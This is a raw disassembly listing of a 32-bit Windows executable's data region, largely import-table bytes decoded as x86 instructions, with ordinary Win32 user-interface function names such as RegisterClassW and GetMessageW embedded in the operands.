  4123a7:	add    BYTE PTR [eax+edi*1],dh
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	dec    edx
  4123ad:	cmp    BYTE PTR [ecx],al
  4123af:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123b3:	add    BYTE PTR [eax+edi*1+0x1],ch
  4123b7:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	stos   BYTE PTR es:[edi],al
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [esi-0x35fffec8],dh
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    dh,bl
  4123cd:	cmp    BYTE PTR [ecx],al
  4123cf:	add    dh,ch
  4123d1:	cmp    BYTE PTR [ecx],al
  4123d3:	add    dh,bh
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [esi],cl
  4123d9:	cmp    DWORD PTR [ecx],eax
  4123db:	add    BYTE PTR [ecx+edi*1],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	sub    bh,BYTE PTR [ecx]
  4123e2:	add    DWORD PTR [eax],eax
  4123e4:	cmp    BYTE PTR [ecx],bh
  4123e6:	add    DWORD PTR [eax],eax
  4123e8:	inc    esp
  4123e9:	cmp    DWORD PTR [ecx],eax
  4123eb:	add    BYTE PTR [eax+0x39],bl
  4123ee:	add    DWORD PTR [eax],eax
  4123f0:	cmp    DWORD PTR fs:[ecx],eax
  4123f3:	add    BYTE PTR [ecx+edi*1+0x1],dh
  4123f7:	add    BYTE PTR [esi+0x39],bh
  4123fa:	add    DWORD PTR [eax],eax
  4123fc:	xchg   esp,eax
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [esi-0x45fffec7],bl
  412405:	cmp    DWORD PTR [ecx],eax
  412407:	add    al,dl
  412409:	cmp    DWORD PTR [ecx],eax
  41240b:	add    al,ah
  41240d:	cmp    DWORD PTR [ecx],eax
  41240f:	add    al,dh
  412411:	cmp    DWORD PTR [ecx],eax
  412413:	add    ah,bh
  412415:	cmp    DWORD PTR [ecx],eax
  412417:	add    BYTE PTR [eax],cl
  412419:	cmp    al,BYTE PTR [ecx]
  41241b:	add    BYTE PTR [eax],al
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx+edi*1],ah
  412422:	add    DWORD PTR [eax],eax
	...
  41242c:	jmp    0x0:0x4d49a9
  412433:	add    BYTE PTR [edx],al
  412435:	add    BYTE PTR [eax],al
  412437:	add    BYTE PTR [esi],bh
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [ecx-0x76fffcc7],cl
  412441:	sub    eax,0x3
  412446:	add    BYTE PTR [eax],al
  412448:	add    BYTE PTR [eax],al
  41244a:	add    BYTE PTR [eax],al
  41244c:	jmp    0x0:0x4d49a9
  412453:	add    BYTE PTR [edx+0x24],bh
  412456:	add    DWORD PTR [eax],eax
  412458:	add    DWORD PTR [eax],eax
  41245a:	add    BYTE PTR [eax],al
  41245c:	add    DWORD PTR [eax],eax
  41245e:	add    BYTE PTR [eax],al
  412460:	add    DWORD PTR [eax],eax
  412462:	add    BYTE PTR [eax],al
  412464:	jo     0x41248a
  412466:	add    DWORD PTR [eax],eax
  412468:	je     0x41248e
  41246a:	add    DWORD PTR [eax],eax
  41246c:	js     0x412492
  41246e:	add    DWORD PTR [eax],eax
  412470:	je     0x4124bc
  412472:	add    BYTE PTR [eax],al
  412474:	mov    esp,DWORD PTR [ecx+eax*1]
  412477:	add    BYTE PTR [eax],al
  412479:	add    BYTE PTR [eax+0x48],cl
  41247c:	push   ebx
  41247d:	aaa    
  41247e:	inc    edi
  41247f:	inc    esi
  412480:	js     0x4124bb
  412482:	fs ja  0x4124b8
  412485:	data16 cs je 0x4124f8
  412489:	jo     0x41248b
  41248b:	aas    
  41248c:	inc    edi
  41248d:	outs   dx,BYTE PTR gs:[esi]
  41248f:	gs jb  0x4124f3
  412492:	je     0x4124f9
  412494:	push   ebx
  412495:	je     0x4124f8
  412497:	je     0x4124fe
  412499:	inc    eax
  41249a:	inc    eax
  41249b:	pop    ecx
  41249c:	inc    edi
  41249d:	push   eax
  41249e:	inc    ecx
  41249f:	dec    edx
  4124a0:	push   eax
  4124a1:	inc    ecx
  4124a2:	inc    esi
  4124a3:	dec    eax
  4124a4:	dec    ebp
  4124a5:	push   eax
  4124a6:	inc    ecx
  4124a7:	inc    esi
  4124a8:	cmp    al,0x56
	...
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	pop    eax
  4124b9:	and    eax,0x1
  4124be:	add    BYTE PTR [eax],al
  4124c0:	add    BYTE PTR [eax],al
  4124c2:	add    BYTE PTR [eax],al
  4124c4:	enter  0x130,0x0
  4124c8:	add    BYTE PTR [eax],ah
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	adc    BYTE PTR [edi],ah
  4124ce:	add    DWORD PTR [eax],eax
	...
  4124d8:	pop    eax
  4124d9:	xor    al,0x1
  4124db:	add    BYTE PTR [eax-0x1ffffedf],bh
  4124e1:	daa    
  4124e2:	add    DWORD PTR [eax],eax
	...
  4124ec:	mov    al,ds:0x88000134
  4124f1:	and    al,BYTE PTR [ecx]
  4124f3:	add    ah,dh
  4124f5:	daa    
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	pushf  
  412501:	add    DWORD PTR ss:[eax],eax
  412504:	pushf  
  412505:	and    al,BYTE PTR [ecx]
  412507:	add    BYTE PTR [eax+0x128],ch
  41250d:	add    BYTE PTR [eax],al
  41250f:	add    BYTE PTR [eax],al
  412511:	add    BYTE PTR [eax],al
  412513:	add    BYTE PTR [eax],bh
  412515:	aaa    
  412516:	add    DWORD PTR [eax],eax
  412518:	push   eax
  412519:	and    eax,DWORD PTR [ecx]
  41251b:	add    ah,al
  41251d:	sub    BYTE PTR [ecx],al
	...
  412527:	add    BYTE PTR [edx],bl
  412529:	cmp    al,BYTE PTR [ecx]
  41252b:	add    BYTE PTR [ebx+eiz*1+0x1],ch
  41252f:	add    BYTE PTR [eax+0x29],bh
  412532:	add    DWORD PTR [eax],eax
	...
  41253c:	cmp    bh,BYTE PTR [edx]
  41253e:	add    DWORD PTR [eax],eax
  412540:	and    BYTE PTR [ecx+eax*1],ah
	...
  412557:	add    BYTE PTR [eax-0x6dfffed7],al
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    BYTE PTR [edx-0x4ffffed7],ah
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    BYTE PTR [esi-0x2bfffed7],bh
  41256d:	sub    DWORD PTR [ecx],eax
  41256f:	add    ah,ah
  412571:	sub    DWORD PTR [ecx],eax
  412573:	add    dh,dh
  412575:	sub    DWORD PTR [ecx],eax
  412577:	add    BYTE PTR [edx],al
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+ebp*1],dl
  41257e:	add    DWORD PTR [eax],eax
  412580:	and    BYTE PTR [edx],ch
  412582:	add    DWORD PTR [eax],eax
  412584:	sub    al,BYTE PTR cs:[ecx]
  412587:	add    BYTE PTR [esi+0x2a],al
  41258a:	add    DWORD PTR [eax],eax
  41258c:	pop    eax
  41258d:	sub    al,BYTE PTR [ecx]
  41258f:	add    BYTE PTR [esi+0x2a],ah
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	mov    gs,WORD PTR [edx]
  41259a:	add    DWORD PTR [eax],eax
  41259c:	sahf   
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x35fffed6],dh
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    dh,bl
  4125a9:	sub    al,BYTE PTR [ecx]
  4125ab:	add    dl,ch
  4125ad:	sub    al,BYTE PTR [ecx]
  4125af:	add    ah,bh
  4125b1:	sub    al,BYTE PTR [ecx]
  4125b3:	add    BYTE PTR [edx],dl
  4125b5:	sub    eax,DWORD PTR [ecx]
  4125b7:	add    BYTE PTR [esi],bl
  4125b9:	sub    eax,DWORD PTR [ecx]
  4125bb:	add    BYTE PTR [ebx+ebp*1],ch
  4125be:	add    DWORD PTR [eax],eax
  4125c0:	inc    eax
  4125c1:	sub    eax,DWORD PTR [ecx]
  4125c3:	add    BYTE PTR [esi+0x2b],cl
  4125c6:	add    DWORD PTR [eax],eax
  4125c8:	sub    eax,DWORD PTR fs:[ecx]
  4125cb:	add    BYTE PTR [edx+0x2b],dh
  4125ce:	add    DWORD PTR [eax],eax
  4125d0:	test   BYTE PTR [ebx],ch
  4125d2:	add    DWORD PTR [eax],eax
  4125d4:	mov    gs,WORD PTR [ebx]
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	sahf   
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [eax-0x3bfffed5],bh
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    al,dl
  4125e5:	sub    eax,DWORD PTR [ecx]
  4125e7:	add    ah,ch
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    ah,bh
  4125ed:	sub    eax,DWORD PTR [ecx]
  4125ef:	add    BYTE PTR [edx],cl
  4125f1:	sub    al,0x1
  4125f3:	add    BYTE PTR [eax],bl
  4125f5:	sub    al,0x1
  4125f7:	add    BYTE PTR [esp+ebp*1],ah
  4125fa:	add    DWORD PTR [eax],eax
  4125fc:	cmp    BYTE PTR [ecx+eax*1],ch
  4125ff:	add    BYTE PTR [esi+0x2c],cl
  412602:	add    DWORD PTR [eax],eax
  412604:	pop    edx
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [edx+0x2c],ch
  41260a:	add    DWORD PTR [eax],eax
  41260c:	jl     0x41263a
  41260e:	add    DWORD PTR [eax],eax
  412610:	mov    gs,WORD PTR [ecx+eax*1]
  412613:	add    BYTE PTR [eax-0x47fffed4],ah
  412619:	sub    al,0x1
  41261b:	add    al,cl
  41261d:	sub    al,0x1
  41261f:	add    dh,dl
  412621:	sub    al,0x1
  412623:	add    ah,ah
  412625:	sub    al,0x1
  412627:	add    dh,dh
  412629:	sub    al,0x1
  41262b:	add    BYTE PTR [esi],al
  41262d:	sub    eax,0x2d140001
  412632:	add    DWORD PTR [eax],eax
  412634:	es sub eax,0x2d3c0001
  41263a:	add    DWORD PTR [eax],eax
  41263c:	dec    edx
  41263d:	sub    eax,0x2d5a0001
  412642:	add    DWORD PTR [eax],eax
  412644:	push   0x2d
  412646:	add    DWORD PTR [eax],eax
  412648:	je     0x412677
  41264a:	add    DWORD PTR [eax],eax
  41264c:	test   BYTE PTR ds:0x2d900001,ch
  412652:	add    DWORD PTR [eax],eax
  412654:	sahf   
  412655:	sub    eax,0x2daa0001
  41265a:	add    DWORD PTR [eax],eax
  41265c:	mov    eax,0xd000012d
  412661:	sub    eax,0x2dde0001
  412666:	add    DWORD PTR [eax],eax
  412668:	out    dx,al
  412669:	sub    eax,0x2dfe0001
  41266e:	add    DWORD PTR [eax],eax
  412670:	or     al,0x2e
  412672:	add    DWORD PTR [eax],eax
  412674:	push   ds
  412675:	add    DWORD PTR cs:[eax],eax
  412678:	xor    ch,BYTE PTR [esi]
  41267a:	add    DWORD PTR [eax],eax
  41267c:	dec    esi
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	pop    esi
  412681:	add    DWORD PTR cs:[eax],eax
  412684:	je     0x4126b4
  412686:	add    DWORD PTR [eax],eax
  412688:	xchg   BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	call   0x12e:0xac00012e
  412693:	add    BYTE PTR [esi-0x33fffed2],bh
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	fisubr DWORD PTR [esi]
  41269e:	add    DWORD PTR [eax],eax
  4126a0:	out    dx,al
  4126a1:	add    DWORD PTR cs:[eax],eax
  4126a4:	cli    
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	push   cs
  4126a9:	das    
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	push   ds
  4126ad:	das    
  4126ae:	add    DWORD PTR [eax],eax
  4126b0:	cs das 
  4126b2:	add    DWORD PTR [eax],eax
  4126b4:	inc    eax
  4126b5:	das    
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	pop    eax
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	outs   dx,BYTE PTR ds:[esi]
  4126bd:	das    
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	jle    0x4126f1
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	call   0x12f:0xae00012f
  4126cb:	add    BYTE PTR [edx-0x39fffed1],bh
  4126d1:	das    
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	aam    0x2f
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	in     al,0x2f
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	cli    
  4126dd:	das    
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	or     al,0x30
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	push   ss
  4126e5:	xor    BYTE PTR [ecx],al
  4126e7:	add    BYTE PTR [esi],ch
  4126e9:	xor    BYTE PTR [ecx],al
  4126eb:	add    BYTE PTR [edx],bh
  4126ed:	xor    BYTE PTR [ecx],al
  4126ef:	add    BYTE PTR [eax+esi*1+0x1],cl
  4126f3:	add    BYTE PTR [eax+0x30],bl
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	jb     0x41272a
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	jle    0x41272e
  4126fe:	add    DWORD PTR [eax],eax
  412700:	mov    WORD PTR [eax],?
  412702:	add    DWORD PTR [eax],eax
  412704:	mov    ds:0xb8000130,al
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [eax],al
  41270d:	add    BYTE PTR [eax],al
  41270f:	add    ah,dl
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    al,ch
  412715:	xor    BYTE PTR [ecx],al
  412717:	add    BYTE PTR [eax],al
  412719:	xor    DWORD PTR [ecx],eax
  41271b:	add    BYTE PTR [esi],dl
  41271d:	xor    DWORD PTR [ecx],eax
  41271f:	add    BYTE PTR [esi],ah
  412721:	xor    DWORD PTR [ecx],eax
  412723:	add    BYTE PTR [ecx+esi*1],dh
  412726:	add    DWORD PTR [eax],eax
  412728:	dec    esp
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [edx+0x31],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	xor    WORD PTR [ecx],ax
  412733:	add    BYTE PTR [eax+0x31],bh
  412736:	add    DWORD PTR [eax],eax
  412738:	xchg   esp,eax
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [edx-0x49fffecf],ah
  412741:	xor    DWORD PTR [ecx],eax
  412743:	add    dh,al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    dl,dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    ah,ah
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    ah,ch
  412751:	xor    DWORD PTR [ecx],eax
  412753:	add    ah,bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [esi],cl
  412759:	xor    al,BYTE PTR [ecx]
  41275b:	add    BYTE PTR [edx+esi*1],bl
  41275e:	add    DWORD PTR [eax],eax
  412760:	xor    al,BYTE PTR cs:[ecx]
  412763:	add    BYTE PTR [eax+0x32],al
  412766:	add    DWORD PTR [eax],eax
  412768:	push   esi
  412769:	xor    al,BYTE PTR [ecx]
  41276b:	add    BYTE PTR [esi+0x32],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	js     0x4127a4
  412772:	add    DWORD PTR [eax],eax
  412774:	mov    dh,BYTE PTR [edx]
  412776:	add    DWORD PTR [eax],eax
  412778:	call   0x132:0xb0000132
  41277f:	add    al,al
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    ah,cl
  412785:	xor    al,BYTE PTR [ecx]
  412787:	add    dl,ah
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,dh
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    BYTE PTR [esi],al
  412791:	xor    eax,DWORD PTR [ecx]
  412793:	add    BYTE PTR [esi],dl
  412795:	xor    eax,DWORD PTR [ecx]
  412797:	add    BYTE PTR [ebx+esi*1],ch
  41279a:	add    DWORD PTR [eax],eax
  41279c:	cmp    dh,BYTE PTR [ebx]
  41279e:	add    DWORD PTR [eax],eax
  4127a0:	push   eax
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1+0x1],ah
  4127a7:	add    BYTE PTR [edx+0x33],bh
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cwde   
  4127ad:	xor    eax,DWORD PTR [ecx]
  4127af:	add    BYTE PTR [eax-0x43fffecd],dh
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    dh,cl
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    dl,bl
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    dh,ch
  4127c1:	xor    eax,DWORD PTR [ecx]
  4127c3:	add    BYTE PTR [esi],al
  4127c5:	xor    al,0x1
  4127c7:	add    BYTE PTR [edx],dl
  4127c9:	xor    al,0x1
  4127cb:	add    BYTE PTR [eax],ah
  4127cd:	xor    al,0x1
  4127cf:	add    BYTE PTR [edx],dh
  4127d1:	xor    al,0x1
  4127d3:	add    BYTE PTR [edx+0x34],al
  4127d6:	add    DWORD PTR [eax],eax
  4127d8:	dec    esp
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [eax],al
  4127dd:	add    BYTE PTR [eax],al
  4127df:	add    BYTE PTR [esi+0x34],ah
  4127e2:	add    DWORD PTR [eax],eax
  4127e4:	je     0x41281a
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	xor    BYTE PTR [ecx+eax*1],0x0
  4127ec:	xchg   esp,eax
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [eax],al
  4127f1:	add    BYTE PTR [eax],al
  4127f3:	add    BYTE PTR [esi-0x43fffecc],ch
  4127f9:	xor    al,0x1
  4127fb:	add    dh,cl
  4127fd:	xor    al,0x1
  4127ff:	add    ah,bl
  412801:	xor    al,0x1
  412803:	add    ah,ah
  412805:	xor    al,0x1
  412807:	add    ah,dh
  412809:	xor    al,0x1
  41280b:	add    BYTE PTR [eax],al
  41280d:	xor    eax,0x350e0001
  412812:	add    DWORD PTR [eax],eax
  412814:	push   ss
  412815:	xor    eax,0x35220001
  41281a:	add    DWORD PTR [eax],eax
  41281c:	sub    al,0x35
  41281e:	add    DWORD PTR [eax],eax
  412820:	ss xor eax,0x353e0001
  412826:	add    DWORD PTR [eax],eax
  412828:	dec    eax
  412829:	xor    eax,0x35520001
  41282e:	add    DWORD PTR [eax],eax
  412830:	pop    esp
  412831:	xor    eax,0x35680001
  412836:	add    DWORD PTR [eax],eax
  412838:	je     0x41286f
  41283a:	add    DWORD PTR [eax],eax
  41283c:	jle    0x412873
  41283e:	add    DWORD PTR [eax],eax
  412840:	mov    BYTE PTR ds:0x35920001,dh
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    al,ds:0xa8000135
  41284d:	xor    eax,0x35b40001
  412852:	add    DWORD PTR [eax],eax
  412854:	mov    esi,0xc8000135
  412859:	xor    eax,0x35d20001
  41285e:	add    DWORD PTR [eax],eax
  412860:	fidiv  WORD PTR ds:0x35ec0001
  412866:	add    DWORD PTR [eax],eax
  412868:	clc    
  412869:	xor    eax,0x36000001
  41286e:	add    DWORD PTR [eax],eax
  412870:	or     al,0x36
  412872:	add    DWORD PTR [eax],eax
  412874:	push   ss
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	and    BYTE PTR [esi],dh
  41287a:	add    DWORD PTR [eax],eax
  41287c:	sub    BYTE PTR [esi],dh
  41287e:	add    DWORD PTR [eax],eax
  412880:	xor    dh,BYTE PTR [esi]
  412882:	add    DWORD PTR [eax],eax
  412884:	cmp    al,0x36
  412886:	add    DWORD PTR [eax],eax
  412888:	inc    esi
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	push   eax
  41288d:	add    DWORD PTR ss:[eax],eax
  412890:	pop    edx
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	fs add DWORD PTR ss:[eax],eax
  412898:	outs   dx,BYTE PTR ds:[esi]
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	xor    BYTE PTR [esi],0x1
  41289f:	add    BYTE PTR [edx+0x136],dl
  4128a5:	add    BYTE PTR [eax],al
  4128a7:	add    BYTE PTR [eax-0x3ffffeca],ch
  4128ad:	add    DWORD PTR ss:[eax],eax
  4128b0:	fdiv   DWORD PTR [esi]
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	hlt    
  4128b5:	add    DWORD PTR ss:[eax],eax
  4128b8:	or     al,0x37
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	and    al,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	add    BYTE PTR [eax],al
  4128c2:	add    BYTE PTR [eax],al
  4128c4:	inc    esi
  4128c5:	aaa    
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	pop    esp
  4128c9:	aaa    
  4128ca:	add    DWORD PTR [eax],eax
  4128cc:	jo     0x412905
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jle    0x412909
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	mov    dh,BYTE PTR [edi]
  4128d6:	add    DWORD PTR [eax],eax
  4128d8:	cwde   
  4128d9:	aaa    
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128dd:	aaa    
  4128de:	add    DWORD PTR [eax],eax
  4128e0:	mov    ah,0x37
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	les    esi,FWORD PTR [edi]
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	into   
  4128e9:	aaa    
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	fidiv  DWORD PTR [edi]
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	repnz aaa 
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	push   es
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [eax],bl
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    BYTE PTR [eax],ch
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    BYTE PTR [eax+edi*1],dh
  412902:	add    DWORD PTR [eax],eax
  412904:	dec    edx
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    BYTE PTR [eax+edi*1+0x1],bl
  41290b:	add    BYTE PTR [eax+edi*1+0x1],ch
  41290f:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  412916:	add    DWORD PTR [eax],eax
  412918:	stos   BYTE PTR es:[edi],al
  412919:	cmp    BYTE PTR [ecx],al
  41291b:	add    BYTE PTR [esi-0x35fffec8],dh
  412921:	cmp    BYTE PTR [ecx],al
  412923:	add    dh,bl
  412925:	cmp    BYTE PTR [ecx],al
  412927:	add    dh,ch
  412929:	cmp    BYTE PTR [ecx],al
  41292b:	add    dh,bh
  41292d:	cmp    BYTE PTR [ecx],al
  41292f:	add    BYTE PTR [esi],cl
  412931:	cmp    DWORD PTR [ecx],eax
  412933:	add    BYTE PTR [ecx+edi*1],bl
  412936:	add    DWORD PTR [eax],eax
  412938:	sub    bh,BYTE PTR [ecx]
  41293a:	add    DWORD PTR [eax],eax
  41293c:	cmp    BYTE PTR [ecx],bh
  41293e:	add    DWORD PTR [eax],eax
  412940:	inc    esp
  412941:	cmp    DWORD PTR [ecx],eax
  412943:	add    BYTE PTR [eax+0x39],bl
  412946:	add    DWORD PTR [eax],eax
  412948:	cmp    DWORD PTR fs:[ecx],eax
  41294b:	add    BYTE PTR [ecx+edi*1+0x1],dh
  41294f:	add    BYTE PTR [esi+0x39],bh
  412952:	add    DWORD PTR [eax],eax
  412954:	xchg   esp,eax
  412955:	cmp    DWORD PTR [ecx],eax
  412957:	add    BYTE PTR [esi-0x45fffec7],bl
  41295d:	cmp    DWORD PTR [ecx],eax
  41295f:	add    al,dl
  412961:	cmp    DWORD PTR [ecx],eax
  412963:	add    al,ah
  412965:	cmp    DWORD PTR [ecx],eax
  412967:	add    al,dh
  412969:	cmp    DWORD PTR [ecx],eax
  41296b:	add    ah,bh
  41296d:	cmp    DWORD PTR [ecx],eax
  41296f:	add    BYTE PTR [eax],cl
  412971:	cmp    al,BYTE PTR [ecx]
  412973:	add    BYTE PTR [eax],al
  412975:	add    BYTE PTR [eax],al
  412977:	add    BYTE PTR [edx+edi*1],ah
  41297a:	add    DWORD PTR [eax],eax
  41297c:	add    BYTE PTR [eax],al
  41297e:	add    BYTE PTR [eax],al
  412980:	add    eax,0x67655202
  412985:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41298c:	popa   
  41298d:	jae    0x412a02
  41298f:	push   edi
  412990:	add    BYTE PTR [eax],al
  412992:	push   ebp
  412993:	add    DWORD PTR [edi+0x65],eax
  412996:	je     0x4129eb
  412998:	arpl   WORD PTR [edx+0x6f],si
  41299b:	ins    BYTE PTR es:[edi],dx
  41299c:	ins    BYTE PTR es:[edi],dx
  41299d:	push   eax
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	jae    0x4129a1
  4129a1:	add    BYTE PTR [ecx+0x616f4c01],ch
  4129a7:	fs inc edx
  4129a9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x44004170
  4129b1:	add    BYTE PTR [ebx+0x6c],al
  4129b4:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4129bb:	jb     0x4129bd
  4129bd:	add    BYTE PTR [edx+0x2],cl
  4129c0:	push   ebx
  4129c1:	gs je  0x412a11
  4129c4:	outs   dx,BYTE PTR gs:[esi]
  4129c6:	jne    0x412a0c
  4129c8:	gs popaw 
  4129cb:	jne    0x412a39
  4129cd:	je     0x412a18
  4129cf:	je     0x412a36
  4129d1:	ins    DWORD PTR es:[edi],dx
  4129d2:	add    BYTE PTR [eax],al
  4129d4:	pop    edi
  4129d5:	add    dl,BYTE PTR [ebx+0x65]
  4129d8:	je     0x412a2d
  4129da:	jns    0x412a4f
  4129dc:	inc    ebx
  4129dd:	outs   dx,DWORD PTR ds:[esi]
  4129de:	ins    BYTE PTR es:[edi],dx
  4129df:	outs   dx,DWORD PTR ds:[esi]
  4129e0:	jb     0x412a55
  4129e2:	add    BYTE PTR [eax],al
  4129e4:	mov    ds:0x57734901,eax
  4129e9:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  4129f0:	jae    0x412a5b
  4129f2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4129f6:	push   0x74654701
  4129fb:	push   edi
  4129fc:	imul   ebp,DWORD PTR [esi+0x64],0xa100776f
  412a03:	add    DWORD PTR [ecx+0x73],ecx
  412a06:	push   edi
  412a07:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412a0e:	popa   
  412a0f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412a13:	add    al,ch
  412a15:	add    DWORD PTR [edi+0x70],ecx
  412a18:	outs   dx,BYTE PTR gs:[esi]
  412a1a:	dec    ecx
  412a1b:	arpl   WORD PTR [edi+0x6e],bp
  412a1e:	add    BYTE PTR [eax],al
  412a20:	stos   DWORD PTR es:[edi],eax
  412a21:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412a25:	fs inc ebx
  412a27:	jne    0x412a9b
  412a29:	jae    0x412a9a
  412a2b:	jb     0x412a6e
  412a2d:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  412a34:	jae    0x412aa2
  412a36:	popa   
  412a37:	je     0x412a9e
  412a39:	inc    ecx
  412a3a:	arpl   WORD PTR [ebx+0x65],sp
  412a3d:	ins    BYTE PTR es:[edi],dx
  412a3e:	gs jb  0x412aa2
  412a41:	je     0x412ab2
  412a43:	jb     0x412a9c
  412a45:	add    BYTE PTR [ecx+0x0],ah
  412a48:	inc    ebx
  412a49:	jb     0x412ab0
  412a4b:	popa   
  412a4c:	je     0x412ab3
  412a4e:	push   eax
  412a4f:	outs   dx,DWORD PTR ds:[esi]
  412a50:	jo     0x412ac7
  412a52:	jo     0x412aa1
  412a54:	outs   dx,BYTE PTR gs:[esi]
  412a56:	jne    0x412a58
  412a58:	add    BYTE PTR ss:[ebx+0x68],al
  412a5c:	popa   
  412a5d:	jb     0x412ab4
  412a5f:	jo     0x412ad1
  412a61:	gs jb  0x412aa5
  412a64:	add    BYTE PTR [eax],al
  412a66:	mov    ds:0x57734901,al
  412a6b:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412a72:	imul   esp,DWORD PTR [ebx+0x6f],0x3b006564
  412a79:	add    DWORD PTR [edi+0x65],eax
  412a7c:	je     0x412acb
  412a7e:	gs jae 0x412af4
  412a81:	popa   
  412a82:	addr16 gs inc ebp
  412a85:	js     0x412afb
  412a87:	jb     0x412aea
  412a89:	dec    ecx
  412a8a:	outs   dx,BYTE PTR ds:[esi]
  412a8b:	outs   dx,WORD PTR ds:[esi]
  412a8d:	add    BYTE PTR [esi+0x0],al
  412a90:	inc    ebx
  412a91:	ins    BYTE PTR es:[edi],dx
  412a92:	outs   dx,DWORD PTR ds:[esi]
  412a93:	jae    0x412afa
  412a95:	inc    esp
  412a96:	gs jae 0x412b04
  412a99:	je     0x412b0a
  412a9b:	jo     0x412a9d
  412a9d:	add    cl,ch
  412a9f:	add    DWORD PTR [edi+0x70],ecx
